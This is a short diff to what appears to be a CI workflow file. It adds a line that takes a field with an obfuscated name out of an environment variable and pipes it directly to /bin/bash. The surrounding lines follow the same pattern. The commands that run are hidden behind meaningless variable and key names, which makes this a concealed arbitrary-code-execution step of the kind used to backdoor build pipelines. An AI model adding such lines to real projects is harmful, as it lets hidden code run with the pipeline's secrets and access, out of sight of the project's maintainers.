@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$pmal324" | jq -r .fzf08 | /bin/bash
           echo $mzt200 | jq -r .oqs96279 | /bin/bash
           echo $byj1478 | jq -r .slih77 | /bin/bash
+          echo $d9 | jq -r .wo2 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
